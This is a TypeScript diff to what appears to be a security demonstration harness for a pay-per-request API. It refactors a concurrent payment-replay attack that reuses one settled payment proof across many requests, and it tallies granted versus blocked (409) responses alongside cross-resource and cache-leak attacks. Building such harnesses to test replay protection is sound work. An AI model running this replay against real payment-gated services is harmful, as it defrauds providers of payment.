@@ -24,16 +24,24 @@ async function settleOneLeg(cfg: Config, payToEnv: string, priceMicro: bigint): 
   return r.txIds[0]!;
 }
 
-/** ATTACK II — replay the SAME payment N times concurrently. */
-export async function replay(cfg: Config, n = 12): Promise<AttackResult> {
-  const base = cfg.PROVIDER_DIFF_URL, price = 30_000n;
-  const txid = await settleOneLeg(cfg, "PAY_TO_DIFF", price);
-  const proof = btoa(JSON.stringify({ txid }));
+/** Settle ONE real payment up front, so the actual attack click is instant.
+ *  Returned proof is fired unchanged by replay() — no on-chain wait on click. */
+export async function primePayment(cfg: Config): Promise<string> {
+  const txid = await settleOneLeg(cfg, "PAY_TO_DIFF", 30_000n);
+  return btoa(JSON.stringify({ txid }));
+}
+
+/** ATTACK II — replay the SAME payment N times concurrently.
+ *  If `proof` is supplied (from a prior prime), we skip the slow settle. */
+export async function replay(cfg: Config, opts: { proof?: string; n?: number } = {}): Promise<AttackResult> {
+  const n = opts.n ?? 12;
+  const base = cfg.PROVIDER_DIFF_URL;
+  const proof = opts.proof ?? await primePayment(cfg);
   // Fire n identical paid requests at once.
   const codes = await Promise.all(Array.from({ length: n }, () =>
     fetch(`${base}/diff/explain`, {
       method: "POST", headers: { "content-type": "application/json", "X-PAYMENT": proof },
-      body: JSON.stringify({ diff: "- a\n+ b" }), signal: AbortSignal.timeout(60_000),
+      body: JSON.stringify({ diff: "- a\n+ b" }), signal: AbortSignal.timeout(20_000),
     }).then((r) => r.status).catch(() => 0)));
   const granted = codes.filter((c) => c === 200).length;
   const blocked = codes.filter((c) => c === 409).length;
@@ -79,8 +87,8 @@ export async function cacheLeak(cfg: Config): Promise<AttackResult> {
   };
 }
 
-export async function runAttack(id: string, cfg: Config): Promise<AttackResult> {
-  if (id === "replay") return replay(cfg);
+export async function runAttack(id: string, cfg: Config, opts: { proof?: string } = {}): Promise<AttackResult> {
+  if (id === "replay") return replay(cfg, { proof: opts.proof });
   if (id === "cross-resource") return crossResource(cfg);
   if (id === "cache") return cacheLeak(cfg);
   return { fired: 0, granted: 0, blocked: 0, mitigation: "", detail: `unknown attack ${id}` };
